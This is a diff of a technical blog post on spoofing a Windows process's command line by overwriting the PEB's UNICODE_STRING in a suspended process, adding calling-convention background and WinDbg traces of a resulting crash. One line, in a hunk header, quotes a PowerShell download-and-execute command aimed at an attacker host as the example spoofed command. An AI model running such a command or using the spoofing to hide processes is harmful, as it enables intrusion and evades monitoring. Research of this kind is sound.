@@ -21,7 +21,7 @@ powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://atta
 
 Note this example is not great since the length of the old commandline is smaller than the new commandline length - we will discuss that shortly.
 
-## Background - PEB and UNICODE_STRING
+## Background - PEB, UNICODE_STRING and calling convention
 I did mention what the PEB is in the past [when I talked about shellcodes](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/), but for the sake of completion, I will mention it briefly here too.  
 The [Process Environment Block (PEB)](https://en.wikipedia.org/wiki/Process_Environment_Block) is a semi-documented data structure in Windows, meant to be a semi userland copy of the kernel [EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm) structure.  
 The motivation for keeping two structures is to save costs - for instance, by consulting the `PEB`, a process can know what DLLs are loaded to it or what commandline it has without consulting the kernel.  
@@ -37,6 +37,9 @@ typedef struct _UNICODE_STRING {
 
 The `Buffer` points to the actual wide string (note it's just a pointer), while the `Length` corresponds to the string's length (in bytes), *excluding* the NUL terminator. Lastly, the `MaximumLength` corresponds to the string buffer's capacity (in bytes), *including* the NUL terminator.  
 Note: on 64-bit systems, there is a 4-bit padding between `MaximumLength` and `Buffer` to make the `Buffer` member 8-byte aligned.
+
+Lastly, when debugging, we will be relying a bit on the 64-bit calling convention, which means first four arguments to functions are passed via registers `rcx`, `rdx`, `r8` and `r9`.  
+This is again a clear 64-bit difference (32-bit calling conventions pass arguments on the stack).
 
 ## Previous known work
 In this section, I will try to describe the main logic that can be found in many places all over the internet.  
@@ -78,3 +81,83 @@ This requires some debugging, as our algorithm should work in principal!
 ## Debugging the problem
 At this point, I set up my debugger [WinDbg](https://en.wikipedia.org/wiki/WinDbg) and attach to the suspended process just before calling [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread). As expected, everything actually seems to be in order:
 
+```
+0:001> !peb
+PEB at 0000005615f57000
+    InheritedAddressSpace:    No
+    ReadImageFileExecOptions: No
+    BeingDebugged:            Yes
+    ImageBaseAddress:         00007ff6e4fa0000
+    NtGlobalFlag:             0
+    NtGlobalFlag2:            0
+    Ldr                       0000000000000000
+    *** unable to read Ldr table at 0000000000000000
+    SubSystemData:     0000000000000000
+    ProcessHeap:       0000000000000000
+    ProcessParameters: 000001b0a1330000
+    CurrentDirectory:  'C:\temp\'
+    WindowTitle:  'C:\Windows\system32\cmd.exe'
+    ImageFile:    'C:\Windows\system32\cmd.exe'
+    CommandLine:  'C:\Windows\system32\cmd.exe /c echo looooooong'
+    DllPath:      '< Name not readable >'
+    Environment:  000001b0a1330734
+        =::=::\
+        =C:=C:\temp
+        =ExitCode=00000000
+        ALLUSERSPROFILE=C:\ProgramData
+...
+```
+
+However, after resumption we get a crash:
+
+```
+        windir=C:\WINDOWS
+0:001> g
+ModLoad: 00007ff8`7e830000 00007ff8`7e8f9000   C:\WINDOWS\System32\KERNEL32.DLL
+ModLoad: 00007ff8`7d480000 00007ff8`7d872000   C:\WINDOWS\System32\KERNELBASE.dll
+(30f0.2954): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+ntdll!RtlUnicodeStringToAnsiString+0x159:
+00007ff8`7fef60a9 410fb70451      movzx   eax,word ptr [r9+rdx*2] ds:000001b0`a16456e0=????
+0:000> k
+ # Child-SP          RetAddr               Call Site
+00 00000056`160fe540 00007ff8`7d4aeaa7     ntdll!RtlUnicodeStringToAnsiString+0x159
+01 00000056`160fe5e0 00007ff8`7d53d03d     KERNELBASE!_KernelBaseBaseDllInitialize+0x497
+02 00000056`160fe850 00007ff8`7ff9f89e     KERNELBASE!KernelBaseDllInitialize+0xd
+03 00000056`160fe8a0 00007ff8`7fe4bcae     ntdll!LdrpCallInitRoutineInternal+0x22
+04 00000056`160fe8d0 00007ff8`7fe497ac     ntdll!LdrpCallInitRoutine+0x10e
+05 00000056`160fe940 00007ff8`7fed76ea     ntdll!LdrpInitializeNode+0x19c
+06 00000056`160fea50 00007ff8`7fed7716     ntdll!LdrpInitializeGraphRecurse+0x6a
+07 00000056`160fea90 00007ff8`7fed6203     ntdll!LdrpInitializeGraphRecurse+0x96
+08 00000056`160fead0 00007ff8`7fe56414     ntdll!LdrpPrepareModuleForExecution+0xef
+09 00000056`160feb10 00007ff8`7fe56020     ntdll!LdrpLoadDllInternal+0x284
+0a 00000056`160feba0 00007ff8`7fe7fa20     ntdll!LdrpLoadDll+0x100
+0b 00000056`160fed70 00007ff8`7fed8b04     ntdll!LdrLoadDll+0x170
+0c 00000056`160fee60 00007ff8`7fefd6a5     ntdll!LdrpInitializeKernel32Functions+0xc0
+0d 00000056`160ff000 00007ff8`7fefba50     ntdll!LdrpInitializeProcess+0x1951
+0e 00000056`160ff430 00007ff8`7fefb83a     ntdll!LdrpInitialize+0x16c
+0f 00000056`160ff4b0 00007ff8`7ff2910e     ntdll!LdrpInitializeInternal+0x5a
+10 00000056`160ff500 00000000`00000000     ntdll!LdrInitializeThunk+0xe
+```
+
+What's going on? We see a crash in [ntdll!RtlUnicodeStringToAnsiString](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlunicodestringtoansistring).  
+Debugging it further, it's obvious the input `UNICODE_STRING` is corrupted, e.g., when setting a breakpoint on `RtlUnicodeStringToAnsiString` and displaying the 2nd argument (`rdx`):
+
+```
+0:001> bu ntdll!RtlUnicodeStringToAnsiString
+0:001> g
+ModLoad: 00007ff8`7e830000 00007ff8`7e8f9000   C:\WINDOWS\System32\KERNEL32.DLL
+ModLoad: 00007ff8`7d480000 00007ff8`7d872000   C:\WINDOWS\System32\KERNELBASE.dll
+Breakpoint 0 hit
+ntdll!RtlUnicodeStringToAnsiString:
+00007ff8`7fef5f50 4c8bdc          mov     r11,rsp
+0:000> dt _UNICODE_STRING @rdx
+ntdll!_UNICODE_STRING
+ "--- memory read error at address 0x00000220`a56956e0 ---"
+   +0x000 Length           : 0x5c
+   +0x002 MaximumLength    : 0x5e
+   +0x008 Buffer           : 0x00000220`a56956e0  "--- memory read error at address 0x00000220`a56956e0 ---"
+```
+
+The `Length` and `MaximumLength` seem to be okay, but the buffer does not make sense, especially if comparing the buffer address we got from [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and the value of the `Buffer` member here. At some point after resuming the thread, the address gets overridden!  
